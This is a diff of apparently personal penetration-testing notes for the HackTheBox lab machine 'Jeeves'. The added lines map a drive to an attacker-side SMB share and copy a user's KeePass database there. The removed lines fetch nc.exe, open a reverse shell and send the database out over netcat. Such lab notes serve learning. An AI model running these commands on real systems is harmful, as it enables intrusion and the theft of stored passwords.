@@ -42,20 +42,11 @@ python smbserver.py TRY ~/Documents/htb/jeeves/smb
 Confirm SMB
 smbclient -L 10.10.14.11 --no-pass      
 
+Map drive
 New-PSDrive -Name "FollowMe" -PSProvider "FileSystem" -Root "\\10.10.14.11\TRY"
 cd FollowMe:
-New-PSDrive -Name "FollowMe" -PSProvider "FileSystem" -Root "\\10.10.14.11\TRY"
+cp C:\Users\kohsuke\Documents\CEH.kdbx .
 
-
-NC get session
-powershell wget "http://10.10.14.11/nc.exe" -outfile "nc.exe"
-nc.exe -e cmd.exe 10.10.14.11 1234
-NC copy false:
-powershell wget "http://10.10.14.11/nc.exe" -outfile "nc.exe"
-nc.exe -w 3 10.10.14.11 1234 < CEH.kdbx
-nc -nvlp 1234
-
-nc -lp 1235>jeeves.kdbx
 
 
 
